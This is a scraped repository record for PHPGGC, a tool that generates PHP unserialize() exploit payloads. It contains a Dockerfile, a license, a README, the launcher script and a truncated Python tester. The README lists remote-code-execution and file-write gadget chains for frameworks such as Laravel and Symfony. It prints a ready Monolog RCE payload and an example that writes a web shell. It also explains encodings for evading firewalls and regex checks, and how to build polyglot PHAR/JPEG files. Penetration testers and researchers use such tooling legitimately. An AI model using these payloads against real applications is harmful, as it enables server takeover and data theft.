{
  "metadata": {
    "timestamp": 1736711841428,
    "page": 158,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjE2MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "ambionics/phpggc",
      "stars": 3313,
      "defaultBranch": "master",
      "files": [
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.3837890625,
          "content": "FROM php:8.1-cli-alpine AS builder\n\nRUN apk add python3 py3-rich curl\n\nRUN curl -s https://getcomposer.org/installer | php -- --install-dir=/usr/bin/ --filename=composer\n\nRUN alias composer='php /usr/bin/composer'\n\nCOPY . /phpggc\n\nWORKDIR /phpggc\n\nRUN sed -i '1s|.*|#!/usr/bin/env php|' phpggc && chmod +x phpggc && echo \"phar.readonly=0\" > $PHP_INI_DIR/php.ini\n\nENTRYPOINT [\"/phpggc/phpggc\"]\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 11.091796875,
          "content": "\n                                 Apache License\n                           Version 2.0, January 2004\n                        http://www.apache.org/licenses/\n\n   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION\n\n   1. Definitions.\n\n      \"License\" shall mean the terms and conditions for use, reproduction,\n      and distribution as defined by Sections 1 through 9 of this document.\n\n      \"Licensor\" shall mean the copyright owner or entity authorized by\n      the copyright owner that is granting the License.\n\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n      outstanding shares, or (iii) beneficial ownership of such entity.\n\n      \"You\" (or \"Your\") shall mean an individual or Legal Entity\n      exercising permissions granted by this License.\n\n      \"Source\" form shall mean the preferred form for making modifications,\n      including but not limited to software source code, documentation\n      source, and configuration files.\n\n      \"Object\" form shall mean any form resulting from mechanical\n      transformation or translation of a Source form, including but\n      not limited to compiled object code, generated documentation,\n      and conversions to other media types.\n\n      \"Work\" shall mean the work of authorship, whether in Source or\n      Object form, made available under the License, as indicated by a\n      copyright notice that is included in or attached to the work\n      (an example is provided in the Appendix below).\n\n      \"Derivative Works\" shall mean any work, whether in Source or Object\n      form, that is based on (or derived from) the Work and for which the\n      editorial revisions, annotations, elaborations, or other modifications\n      represent, as a whole, an original work of authorship. For the purposes\n      of this License, Derivative Works shall not include works that remain\n      separable from, or merely link (or bind by name) to the interfaces of,\n      the Work and Derivative Works thereof.\n\n      \"Contribution\" shall mean any work of authorship, including\n      the original version of the Work and any modifications or additions\n      to that Work or Derivative Works thereof, that is intentionally\n      submitted to Licensor for inclusion in the Work by the copyright owner\n      or by an individual or Legal Entity authorized to submit on behalf of\n      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n      designated in writing by the copyright owner as \"Not a Contribution.\"\n\n      \"Contributor\" shall mean Licensor and any individual or Legal Entity\n      on behalf of whom a Contribution has been received by Licensor and\n      subsequently incorporated within the Work.\n\n   2. Grant of Copyright License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      copyright license to reproduce, prepare Derivative Works of,\n      publicly display, publicly perform, sublicense, and distribute the\n      Work and such Derivative Works in Source or Object form.\n\n   3. Grant of Patent License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      (except as stated in this section) patent license to make, have made,\n      use, offer to sell, sell, import, and otherwise transfer the Work,\n      where such license applies only to those patent claims licensable\n      by such Contributor that are necessarily infringed by their\n      Contribution(s) alone or by combination of their Contribution(s)\n      with the Work to which such Contribution(s) was submitted. If You\n      institute patent litigation against any entity (including a\n      cross-claim or counterclaim in a lawsuit) alleging that the Work\n      or a Contribution incorporated within the Work constitutes direct\n      or contributory patent infringement, then any patent licenses\n      granted to You under this License for that Work shall terminate\n      as of the date such litigation is filed.\n\n   4. Redistribution. You may reproduce and distribute copies of the\n      Work or Derivative Works thereof in any medium, with or without\n      modifications, and in Source or Object form, provided that You\n      meet the following conditions:\n\n      (a) You must give any other recipients of the Work or\n          Derivative Works a copy of this License; and\n\n      (b) You must cause any modified files to carry prominent notices\n          stating that You changed the files; and\n\n      (c) You must retain, in the Source form of any Derivative Works\n          that You distribute, all copyright, patent, trademark, and\n          attribution notices from the Source form of the Work,\n          excluding those notices that do not pertain to any part of\n          the Derivative Works; and\n\n      (d) If the Work includes a \"NOTICE\" text file as part of its\n          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n          within a display generated by the Derivative Works, if and\n          wherever such third-party notices normally appear. The contents\n          of the NOTICE file are for informational purposes only and\n          do not modify the License. You may add Your own attribution\n          notices within Derivative Works that You distribute, alongside\n          or as an addendum to the NOTICE text from the Work, provided\n          that such additional attribution notices cannot be construed\n          as modifying the License.\n\n      You may add Your own copyright statement to Your modifications and\n      may provide additional or different license terms and conditions\n      for use, reproduction, or distribution of Your modifications, or\n      for any such Derivative Works as a whole, provided Your use,\n      reproduction, and distribution of the Work otherwise complies with\n      the conditions stated in this License.\n\n   5. Submission of Contributions. Unless You explicitly state otherwise,\n      any Contribution intentionally submitted for inclusion in the Work\n      by You to the Licensor shall be under the terms and conditions of\n      this License, without any additional terms or conditions.\n      Notwithstanding the above, nothing herein shall supersede or modify\n      the terms of any separate license agreement you may have executed\n      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n   7. Disclaimer of Warranty. Unless required by applicable law or\n      agreed to in writing, Licensor provides the Work (and each\n      Contributor provides its Contributions) on an \"AS IS\" BASIS,\n      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n      implied, including, without limitation, any warranties or conditions\n      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A\n      PARTICULAR PURPOSE. You are solely responsible for determining the\n      appropriateness of using or redistributing the Work and assume any\n      risks associated with Your exercise of permissions under this License.\n\n   8. Limitation of Liability. In no event and under no legal theory,\n      whether in tort (including negligence), contract, or otherwise,\n      unless required by applicable law (such as deliberate and grossly\n      negligent acts) or agreed to in writing, shall any Contributor be\n      liable to You for damages, including any direct, indirect, special,\n      incidental, or consequential damages of any character arising as a\n      result of this License or out of the use or inability to use the\n      Work (including but not limited to damages for loss of goodwill,\n      work stoppage, computer failure or malfunction, or any and all\n      other commercial damages or losses), even if such Contributor\n      has been advised of the possibility of such damages.\n\n   9. Accepting Warranty or Additional Liability. While redistributing\n      the Work or Derivative Works thereof, You may choose to offer,\n      and charge a fee for, acceptance of support, warranty, indemnity,\n      or other liability obligations and/or rights consistent with this\n      License. However, in accepting such obligations, You may act only\n      on Your own behalf and on Your sole responsibility, not on behalf\n      of any other Contributor, and only if You agree to indemnify,\n      defend, and hold each Contributor harmless for any liability\n      incurred by, or claims asserted against, such Contributor by reason\n      of your accepting any such warranty or additional liability.\n\n   END OF TERMS AND CONDITIONS\n\n   APPENDIX: How to apply the Apache License to your work.\n\n      To apply the Apache License to your work, attach the following\n      boilerplate notice, with the fields enclosed by brackets \"[]\"\n      replaced with your own identifying information. (Don't include\n      the brackets!)  The text should be enclosed in the appropriate\n      comment syntax for the file format. We also recommend that a\n      file or class name and description of purpose be included on the\n      same \"printed page\" as the copyright notice for easier\n      identification within third-party archives.\n\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 18.0419921875,
          "content": "# PHPGGC: PHP Generic Gadget Chains\n\n*PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically*.\nWhen encountering an unserialize on a website you don't have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent of [frohoff's ysoserial](https://github.com/frohoff/ysoserial), but for PHP.\nCurrently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.\n\n\n## Requirements\n\nPHP >= 5.6 is required to run PHPGGC.\n\n\n## Usage\n\nRun `./phpggc -l` to obtain a list of gadget chains:\n\n```\n$ ./phpggc -l\n\nGadget Chains\n-------------\n\nNAME                                      VERSION                                              TYPE                   VECTOR         I    \nBitrix/RCE1                               17.x.x <= 22.0.300                                   RCE (Function call)    __destruct          \nCakePHP/RCE1                              ? <= 3.9.6                                           RCE (Command)          __destruct          \nCakePHP/RCE2                              ? <= 4.2.3                                           RCE (Function call)    __destruct          \nCodeIgniter4/FR1                          4.0.0 <= 4.3.6                                       File read              __toString     *    \nCodeIgniter4/RCE1                         4.0.2 <= 4.0.3                                       RCE (Function call)    __destruct          \nCodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                  RCE (Function call)    __destruct          \nCodeIgniter4/RCE3                         4.0.4 <= 4.3.6                                       RCE (Function call)    __destruct          \nCodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                           RCE (Function call)    __destruct          \nCodeIgniter4/RCE5                         -4.1.3+                                              RCE (Function call)    __destruct          \nCodeIgniter4/RCE6                         -4.1.3 <= 4.2.10+                                    RCE (Function call)    __destruct          \nDoctrine/FW1                              ?                                                    File write             __toString     *    \nDoctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5                       File write             __destruct     *    \nDoctrine/RCE1                             1.5.1 <= 2.7.2                                       RCE (PHP code)         __destruct     *    \nDoctrine/RCE2                             1.11.0 <= 2.3.2                                      RCE (Function call)    __destruct     *    \nDompdf/FD1                                1.1.1 <= ?                                           File delete            __destruct     *    \n...\n```\n\nFilter gadget chains:\n\n```\n$ ./phpggc -l laravel\n\nGadget Chains\n-------------\n\nNAME             VERSION            TYPE                   VECTOR        I    \nLaravel/RCE1     5.4.27             RCE (Function call)    __destruct         \nLaravel/RCE10    5.6.0 <= 9.1.8+    RCE (Function call)    __toString         \nLaravel/RCE2     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         \nLaravel/RCE3     5.5.0 <= 5.8.35    RCE (Function call)    __destruct    *    \nLaravel/RCE4     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         \nLaravel/RCE5     5.8.30             RCE (PHP code)         __destruct    *    \nLaravel/RCE6     5.5.* <= 5.8.35    RCE (PHP code)         __destruct    *    \nLaravel/RCE7     ? <= 8.16.1        RCE (Function call)    __destruct    *    \nLaravel/RCE8     7.0.0 <= 8.6.9+    RCE (Function call)    __destruct    *    \nLaravel/RCE9     5.4.0 <= 9.1.8+    RCE (Function call)    __destruct         \n```\n\nEvery gadget chain has:\n\n- Name: Name of the framework/library\n- Version: Version of the framework/library for which gadgets are for\n- Type: Type of exploitation: RCE, File Write, File Read, Include...\n- Vector: the vector to trigger the chain after the unserialize (`__destruct()`, `__toString()`, `offsetGet()`, ...)\n- Informations: Other informations about the chain\n\nUse `-i` to get detailed information about a chain:\n\n```\n$ ./phpggc -i symfony/rce1\nName           : Symfony/RCE1\nVersion        : 3.3\nType           : rce\nVector         : __destruct\nInformations   : \nExec through proc_open()\n\n./phpggc Symfony/RCE1 <command>\n```\n\nFor RCE gadgets, the executed command can have 3 formatting types depending on how the gadget works:\n- RCE (Command): `./phpggc Symfony/RCE1 id`\n- RCE (PHP code): `./phpggc Symfony/RCE2 'phpinfo();'`\n- RCE (Function call): `./phpggc Symfony/RCE4 system id`\n\nOnce you have selected a chain, run `./phpggc <gadget-chain> [parameters]` to obtain the payload.\nFor instance, to obtain a payload for Monolog, you'd do:\n\n```\n$ ./phpggc monolog/rce1 assert 'phpinfo()'\nO:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"*socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"*handler\";r:2;s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:10:\"phpinfo();\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"assert\";}}}\n```\n\nFor a file write using SwiftMailer, you'd do:\n\n```\n$ echo 'It works !' > /tmp/data\n$ ./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data\nO:13:\"Swift_Message\":8:{...}\n```\n\n\n## Wrapper\n\nThe `--wrapper` (`-w`) option allows you to define a PHP file containing the following functions:\n\n- `process_parameters(array $parameters)`: Called right **before** `generate()`, allows to change parameters\n- `process_object(object $object)`: Called right **before** `serialize()`, allows to change the object\n- `process_serialized(string $serialized)`: Called right **after** `serialize()`, allows to change the serialized string\n\nFor instance, if the vulnerable code looks like this:\n\n```php\n<?php\n$data = unserialize($_GET['data']);\nprint $data['message'];\n```\n\nYou could use a `__toString()` chain, wrapping it like so:\n\n```php\n<?php\n# /tmp/my_wrapper.php\nfunction process_object($object)\n{\n    return array(\n        'message' => $object\n    );\n}\n```\n\nAnd you'd call phpggc like so:\n\n```\n$ ./phpggc -w /tmp/my_wrapper.php slim/rce1 system id\na:1:{s:7:\"message\";O:18:\"Slim\\Http\\Response\":2:{...}}\n```\n\n\n## PHAR(GGC)\n\n### History\n\nAt BlackHat US 2018, @s_n_t released PHARGGC, a fork of PHPGGC which instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and as such can be used for various exploitation techniques (`file_exists`, `fopen`, etc.). The paper is [here](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf).\n\n### Implementation\n\nPHAR archives come in three different formats: **PHAR, TAR, and ZIP**. The three of them are supported by PHPGGC.\nPolyglot files can be generated using `--phar-jpeg` (`-pj`). Other options are available (use `-h`).\n\n### Examples\n\n```\n$ # Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar\n$ ./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id\n$ # Creates a PHAR file in the ZIP format and stores it in /tmp/z.zip.phar\n$ ./phpggc -p zip -o /tmp/z.zip.phar monolog/rce1 system id\n$ # Creates a polyglot JPEG/PHAR file from image /tmp/dummy.jpg and stores it in /tmp/z.zip.phar\n$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id\n```\n\n\n## Encoders\n\nArguments allow to modify the way the payload is output. For instance, `-u` will URL encode it, and `-b` will convert it to base64.\n**Payloads often contain NULL bytes and cannot be copy/pasted as-is**. Use `-s` for a soft URL encode, which keeps the payload readable.\n\nThe encoders can be chained, and as such **the order is important**. For instance, `./phpggc -b -u -u slim/rce1 system id` will base64 the payload, then URLencode it twice.\n\n\n## Advanced: Enhancements\n\n### Fast destruct\n\nPHPGGC implements a `--fast-destruct` (`-f`) flag, that will make sure your serialized object will be destroyed right after the `unserialize()` call, and not at the end of the script. **I'd recommend using it for every `__destruct` vector**, as it improves reliability. For instance, if PHP script raises an exception after the call, the `__destruct` method of your object might not be called. As it is processed at the same time as encoders, it needs to be set first.\n\n```\n$ ./phpggc -f -s slim/rce1 system id\na:2:{i:7;O:18:\"Slim\\Http\\Response\":2:{s:10:\"...\n```\n\n### ASCII Strings\n\nUses the `S` serialization format instead of the standard `s`. This replaces every non-ASCII char to an hexadecimal representation:\n`s:5:\"A<null_byte>B<cr><lf>\";̀` -> `S:5:\"A\\00B\\09\\0D\";`\nThis can be useful when for some reason non-ascii characters are not allowed (NULL BYTE for instance). Since payloads generally contain them, this makes sure that the payload consists only of ASCII values.\n*Note: this is experimental and it might not work in some cases.*\n\n### Armor Strings\n\nUses the `S` serialization format instead of the standard `s`. This replaces every char to an hexadecimal representation:\n`s:5:\"A<null_byte>B<cr><lf>\";̀` -> `S:5:\"\\41\\00\\42\\09\\0D\";`\nThis comes handy when a firewall or PHP code blocks strings.\n*Note: this is experimental and it might not work in some cases.*\n*Note: this makes each string in the payload grow by a factor of 3.*\n\n### Plus Numbers\n\nSometimes, PHP scripts verify that the given serialized payload does not contain objects by using a regex such as `/O:[0-9]+:`. This is easily bypassed using `O:+123:...` instead of `O:123:`. One can use `--plus-numbers <types>`, or `-n <types>`, to automatically add these `+` signs in front of symbols.\nFor instance, to obfuscate objects and strings, one can use: `--n Os`. Please note that since PHP 7.2, only `i` and `d` (float) types can have a `+`.\n\n### Testing your chain\n\nTo test if the gadget chain you want to use works in the targeted environment, jump to your environment's folder and run the chain argument-free, with the `--test-payload` option.\n\nFor instance, to test if `Monolog/RCE2` works on Symfony `4.x`:\n\n```\n$ composer create-project symfony/website-skeleton=4.x some_symfony\n$ cd some_symfony\n$ phpggc monolog/rce2 --test-payload\nTrying to deserialize payload...\nSUCCESS: Payload triggered !\n```\n\nThe exit code will be `0` if the payload triggered, `1` otherwise.\n\n### Testing your chain against every version of a package\n\nIf you wish to know which versions of a package a gadget chain works against, you can use `test-gc-compatibility.py`.\n\n```\n$ ./test-gc-compatibility.py monolog/monolog monolog/rce1 monolog/rce3\nTesting 59 versions for monolog/monolog against 2 gadget chains.\n\n┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓\n┃ monolog/monolog ┃ Package ┃ monolog/rce1 ┃ monolog/rce3 ┃\n┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩\n│ 2.x-dev         │   OK    │      OK      │      KO      │\n│ 2.3.0           │   OK    │      OK      │      KO      │\n│ 2.2.0           │   OK    │      OK      │      KO      │\n│ 2.1.1           │   OK    │      OK      │      KO      │\n│ 2.1.0           │   OK    │      OK      │      KO      │\n│ 2.0.2           │   OK    │      OK      │      KO      │\n│ 2.0.1           │   OK    │      OK      │      KO      │\n│ 2.0.0           │   OK    │      OK      │      KO      │\n│ 2.0.0-beta2     │   OK    │      OK      │      KO      │\n│ 2.0.0-beta1     │   OK    │      OK      │      KO      │\n│ 1.x-dev         │   OK    │      OK      │      KO      │\n│ 1.26.1          │   OK    │      OK      │      KO      │\n│ 1.26.0          │   OK    │      OK      │      KO      │\n│ 1.25.5          │   OK    │      OK      │      KO      │\n│ 1.25.4          │   OK    │      OK      │      KO      │\n                        ...\n│ 1.0.1           │   OK    │      KO      │      KO      │\n│ 1.0.0           │   OK    │      KO      │      KO      │\n│ 1.0.0-RC1       │   OK    │      KO      │      KO      │\n│ dev-main        │   OK    │      OK      │      KO      │\n│ * dev-phpstan   │   OK    │      OK      │      KO      │\n└─────────────────┴─────────┴──────────────┴──────────────┘\n```\n\nYou can specify the versions you want to test by using the following syntaxe.\n\n```\n$ ./test-gc-compatibility.py monolog/monolog:2.3.0,1.25.4 monolog/rce1 monolog/rce3\nTesting 2 versions for monolog/monolog against 2 gadget chains.\n\n┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓\n┃ monolog/monolog ┃ Package ┃ monolog/rce1 ┃ monolog/rce3 ┃\n┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩\n│ 2.3.0           │   OK    │      OK      │      KO      │\n│ 1.25.4          │   OK    │      OK      │      KO      │\n└─────────────────┴─────────┴──────────────┴──────────────┘\n```\n\n# API\n\nInstead of using PHPGGC as a command line tool, you can program PHP scripts:\n\n```php\n<?php\n\n# Include PHPGGC\ninclude(\"phpggc/lib/PHPGGC.php\");\n\n# Include guzzle/rce1\n$gc = new \\GadgetChain\\Guzzle\\RCE1();\n\n# Always process parameters unless you're doing something out of the ordinary\n$parameters = $gc->process_parameters([\n\t'function' => 'system',\n\t'parameter' => 'id',\n]);\n\n# Generate the payload\n$object = $gc->generate($parameters);\n\n# Most (if not all) GC's do not use process_object and process_serialized, so\n# for quick & dirty code you can omit those two \n$object = $gc->process_object($object);\n\n# Serialize the payload\n$serialized = serialize($object);\n$serialized = $gc->process_serialized($serialized);\n\n# Display it\nprint($serialized . \"\\n\");\n\n# Create a PHAR file from this payload\n$phar = new \\PHPGGC\\Phar\\Tar($serialized);\nfile_put_contents('output.phar.tar', $phar->generate());\n```\n\nThis allows you to tweak the parameters or write exploits more easily.\n*Note: This is pretty experimental at the moment, so please, report bugs*.\n\n\n# Contributing\n\nPull requests are more than welcome. Please follow these simple guidelines:\n\n- `__destruct()` is always the best vector\n- Specify at least the version of the library you've built the payload on\n- Do not include unused parameters in the gadget definition if they keep their default values. It just makes the payload bigger.\n- Respect code style: for instance, opening brackets `{` are on a new line, and arrays should be written as `[1, 2, 3]` instead of the old, `array(1, 2, 3)`, notation.\n\nCodewise, the directory structure is fairly straightforward: gadgets in _gadgets.php_, description + logic in _chain.php_.\nYou can define pre- and post- processing methods, if parameters need to be modified.\nHopefully, the already implemented gadgets should be enough for you to build yours.\nOtherwise, I'd be glad to answer your questions.\n\nPlease test as many versions as you can. The nomenclature for versions is as such: `[-]<lower-version> <= <higher-version>[+]`. The `-` and `+` signs indicate that your payload may work on respectively lower and higher versions. For instance, if your gadget chain works from version 2.0.0 to version 4.4.1, which is the last version at the time, use `2.0.0 <= 4.4.1+`.\n\nThe `--new <framework> <type>` command-line option can be used to create the directory and file structure for a new gadget chain.\nFor instance, use `./phpggc -n Drupal RCE` would create a new Drupal RCE gadgetchain.\n\n\n# Docker\n\nIf you don't want to install PHP, you can build a docker image using:\n\n```\n$ docker build . -t 'phpggc'\n```\n\nYou can then used the dockerized `phpggc`.\n\n### To generate a gadget chain\n\n```\n$ docker run phpggc Monolog/rce1 'system' 'id'\n```\n\n### To test a chain \n\nJump to your environment's folder and run the chain argument-free, with the `--test-payload` option:\n\n```\n$ docker run -v \"$(pwd)\":/app -w /app phpggc Monolog/RCE9 --test-payload\n```\n\n### To generate phar / polyglot files\n\n> Note: The command must be executed in the directory where the input image is located.\n\n```\n$ docker run -v \"$(pwd)\":/images phpggc -pj /images/dummy.jpg -o /images/z.zip.phar Monolog/RCE9 system id\n```\n\n### To run `test-gc-compatibility.py`\n\n```\n$ docker run --entrypoint './test-gc-compatibility.py' phpggc doctrine/doctrine-bundle:2.2,2.7.2 doctrine/rce1 doctrine/rce2\nRuning on PHP version ('PHP 8.1.13 (cli) (built: Nov 30 2022 21:53:44) (NTS).\nTesting 2 versions for doctrine/doctrine-bundle against 2 gadget chains.\n\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n┃ doctrine/doctrine-bundle ┃ Package ┃ doctrine/rce1 ┃ doctrine/rce2 ┃\n┡━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n│ 2.2                      │   OK    │      OK       │      OK       │\n│ 2.7.2                    │   OK    │      OK       │      KO       │\n└──────────────────────────┴─────────┴───────────────┴───────────────┘\n```\n\n# License\n\n[Apache License 2.0](LICENSE)\n"
        },
        {
          "name": "gadgetchains",
          "type": "tree",
          "content": null
        },
        {
          "name": "lib",
          "type": "tree",
          "content": null
        },
        {
          "name": "phpggc",
          "type": "blob",
          "size": 0.2412109375,
          "content": "#!/usr/bin/env -S php -d phar.readonly=0\n<?php\n\nerror_reporting(E_ALL);\n\nrequire_once('lib/PHPGGC.php');\n\n$x = new PHPGGC();\n\ntry\n{\n    $x->generate();\n}\ncatch(\\PHPGGC\\Exception $e)\n{\n    print(\"ERROR: \" . $e->getMessage() . \"\\n\");\n    exit(1);\n}\n"
        },
        {
          "name": "templates",
          "type": "tree",
          "content": null
        },
        {
          "name": "test-gc-compatibility.py",
          "type": "blob",
          "size": 13.779296875,
          "content": "#!/usr/bin/env python3\n\"\"\"\nTest PHPGGC gadget chains against every version of a composer package.\n\nUsage:\n    $ ./test-gc-compatibility.py <composer-package> <gadget-chain-1> [gadget-chain-2...]\n\nExample:\n    $ ./test-gc-compatibility.py monolog/monolog monolog/rce1 monolog/rce3\n\nRequired executables:\n    The program requires phpggc and composer.\n    By default, it will use the `phpggc` from the current directory, and the\n    composer from PATH. If you wish to use other paths, use the `PHPGGC_PATH`\n    and `COMPOSER_PATH` environment variables.\n    If a file cannot be ran straight up, we'll try using `php <file>` instead.\n\nDependencies:\n    $ pip install rich\n    \nVersions:\n    You can specify package version by adding a semicolon to the package name:\n    \n    # Tests version 1.6.0 and 1.6.3\n    $ ./test-gc-compatibility.py doctrine/doctrine-bundle:1.6.0,1.6.3 doctrine/rce1\n    \n    or with a range:\n    \n    # Tests from version 5.0.0 to 6.1.3\n    $ ./test-gc-compatibility.py doctrine/doctrine-bundle:1.6.0..1.12.3 doctrine/rce1\n    \n    If no upper or lower version is present, every version before (resp. after)\n    the specified one will be tested:\n    \n    # from doctrine 1.12.0 to the newest\n    $ ./test-gc-compatibility.py doctrine/doctrine-bundle:1.12.0.. doctrine/rce1\n    # from the first version of doctrine to 1.6.0\n    $ ./test-gc-compatibility.py doctrine/doctrine-bundle:..1.6.0 doctrine/rce1\n    \n\nCredit goes to @M4yFly for the original idea and implementation.\n\"\"\"\n\nimport subprocess\nimport argparse\nimport pathlib\nimport os\nimport re\nimport tempfile\nimport shutil\nfrom concurrent.futures import ProcessPoolExecutor\n\ntry:\n    from rich import print\nexcept ImportError:\n    print(\"Please install the `rich` python3 package to use this program.\")\n    print(\"$ pip install rich\")\n    exit()\n\n\nfrom rich.progress import Progress\nfrom rich.table import Table\n\n\nclass UnableToInstallPackageException(Exception):\n    \"\"\"A package cannot be installed.\"\"\"\n\n\nclass Tester:\n    \"\"\"Tests gadget chains against a composer package.\"\"\"\n\n    _package = None\n    _cwd = None\n\n    def run(self):\n        args = setup_arguments()\n        self._gcs: list[str] = args.gadget_chain\n        self._executor = Executor(args.create_project)\n        self._package = Package(args.package, executor=self._executor)\n        self._workers = args.workers\n\n        for gc in self._gcs:\n            self.ensure_gc_exists(gc)\n\n        php_version = self._executor.php(\"--version\")[0].split(\"\\n\")[0]\n        print(f\"Running on PHP version \" f\"[blue]{php_version}[/blue]\" f\".\")\n\n        versions = self._package.get_target_versions()\n        print(\n            f\"Testing {len(versions)} versions for \"\n            f\"[blue]{self._package.name}[/blue] against \"\n            f\"{len(self._gcs)} gadget chains.\"\n        )\n\n        self.test_chains_on_versions(versions)\n\n    def ensure_gc_exists(self, name):\n        \"\"\"Makes sure that a GC exists.\"\"\"\n        if not self._executor.phpggc(\"-i\", name):\n            raise TesterException(f\"Gadget chain does not exist: {name}\")\n\n    def test_chains_on_versions(self, versions):\n        \"\"\"Contains the main logic. Each version of the package will be\n        installed, and each gadget chain will be tested against it. Results\n        are kept in a table.\n        \"\"\"\n        table = Table(self._package.name)\n        table.add_column(\"Package\", justify=\"center\")\n\n        for gc in self._gcs:\n            table.add_column(gc, justify=\"center\")\n\n        errored_payload_rows = (self.__status_str(False),) + (\"[yellow]-\",) * len(\n            self._gcs\n        )\n\n        with Progress() as progress, ProcessPoolExecutor(self._workers) as ppe:\n            ptask = progress.add_task(\"Testing chains\", total=len(versions))\n\n            futures = {\n                version: ppe.submit(self.test_chains_on_version, version)\n                for version in versions\n            }\n            for version, future in futures.items():\n                future.add_done_callback(\n                    lambda f: progress.update(\n                        ptask, advance=1, description=f\"Testing ({version})\"\n                    )\n                )\n\n            for version, future in futures.items():\n                try:\n                    tests = future.result()\n                except KeyboardInterrupt:\n                    ppe.shutdown(cancel_futures=True)\n                    raise\n                except UnableToInstallPackageException:\n                    table.add_row(version, *errored_payload_rows)\n                else:\n                    outputs = [self.__status_str(test) for test in tests]\n                    table.add_row(version, self.__status_str(True), *outputs)\n\n            progress.update(ptask, visible=False)\n\n        print(table)\n\n    def __status_str(self, test):\n        return test and \"[green]OK\" or \"[red]KO\"\n\n    def test_chains_on_version(self, version):\n        pv = PackageVersion(self._package.name, version, self._executor)\n\n        try:\n            pv.install()\n            return [self._executor.phpggc(\"--test-payload\", gc) for gc in self._gcs]\n        finally:\n            pv.cleanup()\n\n\nclass TesterException(Exception):\n    pass\n\n\ndef setup_arguments():\n    parser = argparse.ArgumentParser(\n        description=\"Test PHPGGC gadget chains against every version of a composer package.\",\n        epilog=\"\"\"\\\nExample:\n    $ ./test-gc-compatibility.py monolog/monolog monolog/rce1 monolog/rce3\n\nRequired executables:\n    The program requires phpggc and composer.\n    By default, it will use the `phpggc` from the current directory, and the\n    composer from PATH. If you wish to use other paths, use the `PHPGGC_PATH`\n    and `COMPOSER_PATH` environment variables.\n    If a file cannot be ran straight up, we'll try using `php <file>` instead.\n\nDependencies:\n    $ pip install rich\n    \nVersions:\n  